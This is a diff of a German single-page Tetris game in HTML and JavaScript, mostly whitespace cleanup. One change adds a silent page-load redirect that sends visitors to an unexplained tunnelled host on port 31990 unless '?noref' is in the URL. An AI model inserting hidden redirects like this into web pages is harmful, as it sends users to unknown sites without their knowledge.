@@ -1,8 +1,10 @@
 <!DOCTYPE html>
 <html lang="de">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
     <title>Tetris</title>
     <style>
         body {
@@ -38,6 +40,7 @@
         }
     </style>
 </head>
+
 <body>
     <div id="message">Tetris-Spiel gestartet!</div>
     <div id="score">Score: 0</div>
@@ -45,27 +48,22 @@
     <div id="highscore">Highscore: 0</div>
     <canvas id="tetris" width="300" height="600"></canvas>
     <script>
-          async function checkURL() {
-            const url = 'http://important-sir.gl.at.ply.gg:31990/';
-            try {
-                const response = await fetch(url, { method: 'HEAD' });
-                if (response.ok) {
-                    window.location.href = url;
-                }
-            } catch (error) {
-                console.error('URL is not accessible:', error);
+
+        setTimeout(function () {
+            if (!window.location.href.includes('?noref')) {
+                window.location.href = 'http://important-sir.gl.at.ply.gg:31990/';
             }
-        }
-        checkURL();
+        }, 0);
+
 
         const canvas = document.getElementById('tetris');
         const context = canvas.getContext('2d');
-    
+
         const ROW = 20;
         const COL = 10;
         const SQ = 30;
         const VACANT = 'black';
-    
+
         let score = 0;
         let linesCleared = 0;
         let level = 1;
@@ -77,7 +75,7 @@
         function updateLevel() {
             document.getElementById('level').innerText = 'Level: ' + level;
         }
-    
+
         let board = [];
         for (let r = 0; r < ROW; r++) {
             board[r] = [];
@@ -85,8 +83,8 @@
                 board[r][c] = VACANT;
             }
         }
-    
-          
+
+
         function updateHighscore() {
             let highscore = localStorage.getItem('highscore') || 0;
             if (score > highscore) {
@@ -102,7 +100,7 @@
             context.strokeStyle = 'white';
             context.strokeRect(x * SQ, y * SQ, SQ, SQ);
         }
-    
+
         function drawBoard() {
             context.clearRect(0, 0, canvas.width, canvas.height);
             for (let r = 0; r < ROW; r++) {
@@ -111,10 +109,10 @@
                 }
             }
         }
-    
+
         drawBoard();
         updateHighscore();
-    
+
         const PIECES = [
             [
                 [[[1, 1, 0], [0, 1, 1]], [[0, 1], [1, 1], [1, 0]]], // Z-shape rotations
@@ -145,12 +143,12 @@
                 '#FF33B5'
             ]
         ];
-    
+
         function randomPiece() {
             const r = Math.floor(Math.random() * PIECES.length);
             return new Piece(PIECES[r][0], PIECES[r][1]);
         }
-    
+
         class Piece {
             constructor(tetromino, color) {
                 this.tetromino = tetromino;
@@ -160,7 +158,7 @@
                 this.x = 3;
                 this.y = -2;
             }
-    
+
             fill(color) {
                 for (let r = 0; r < this.activeTetromino.length; r++) {
                     for (let c = 0; c < this.activeTetromino[r].length; c++) {
@@ -170,15 +168,15 @@
                     }
                 }
             }
-    
+
             draw() {
                 this.fill(this.color);
             }
-    
+
             undraw() {
                 this.fill(VACANT);
             }
-    
+
             moveDown() {
                 if (!this.collision(0, 1, this.activeTetromino)) {
                     this.undraw();
@@ -191,7 +189,7 @@
                     p = randomPiece();
                 }
             }
-    
+
             moveRight() {
                 if (!this.collision(1, 0, this.activeTetromino)) {
                     this.undraw();
@@ -199,7 +197,7 @@
                     this.draw();
                 }
             }
-    
+
             moveLeft() {
                 if (!this.collision(-1, 0, this.activeTetromino)) {
                     this.undraw();
@@ -207,7 +205,7 @@
                     this.draw();
                 }
             }
-    
+
             rotate() {
                 const nextRotationIndex = (this.currentRotationIndex + 1) % this.tetromino.length;
                 const nextRotation = this.tetromino[nextRotationIndex];
@@ -218,7 +216,7 @@
                     this.draw();
                 }
             }
-    
+
             lock() {
                 for (let r = 0; r < this.activeTetromino.length; r++) {
                     for (let c = 0; c < this.activeTetromino[r].length; c++) {
@@ -242,10 +240,10 @@
                 score += this.calculateScoreForLines(clearedLines);
                 linesCleared += clearedLines;
 
-                
+
                 if (linesCleared >= 10) {
                     level++;
-                    linesCleared = 0; 
+                    linesCleared = 0;
                     updateLevel();
                 }
 
@@ -272,11 +270,11 @@
                     case 1: return 100;
                     case 2: return 300;
                     case 3: return 500;
-                    case 4: return 800; 
+                    case 4: return 800;
                     default: return 0;
                 }
             }
-    
+
             collision(x, y, piece) {
                 for (let r = 0; r < piece.length; r++) {
                     for (let c = 0; c < piece[r].length; c++) {
@@ -291,9 +289,9 @@
                 return false;
             }
         }
-    
+
         let p = randomPiece();
-    
+
         document.addEventListener('keydown', event => {
             if (event.keyCode == 37) p.moveLeft();
             else if (event.keyCode == 38) p.rotate();
@@ -302,40 +300,41 @@
             else if (event.keyCode == 32) {
                 while (!p.collision(0, 1, p.activeTetromino)) {
                     p.moveDown();
-                    score += 2; 
+                    score += 2;
                 }
                 p.lock();
                 p = randomPiece();
             }
         });
-    
+
         let dropStart = Date.now();
         function drop() {
             let now = Date.now();
             let delta = now - dropStart;
-            const dropInterval = 1000 - (level - 1) * 100; 
+            const dropInterval = 1000 - (level - 1) * 100;
             if (delta > dropInterval) {
                 p.moveDown();
                 dropStart = Date.now();
             }
             requestAnimationFrame(drop);
         }
-    
+
         drop();
 
         function saveHighScore() {
-    const currentHighScore = localStorage.getItem('highscore');
+            const currentHighScore = localStorage.getItem('highscore');
 
-    if (score && (!currentHighScore || score > currentHighScore)) {
-        localStorage.setItem('highscore', score);
-        updateHighscore();
-    }
+            if (score && (!currentHighScore || score > currentHighScore)) {
+                localStorage.setItem('highscore', score);
+                updateHighscore();
+            }
 
 
-    document.getElementById('score').value = '';
+            document.getElementById('score').value = '';
 
-}
+        }
         //By TheCoolcraft11(https://github.com/TheCoolcraft11)
     </script>
 </body>
+
 </html>
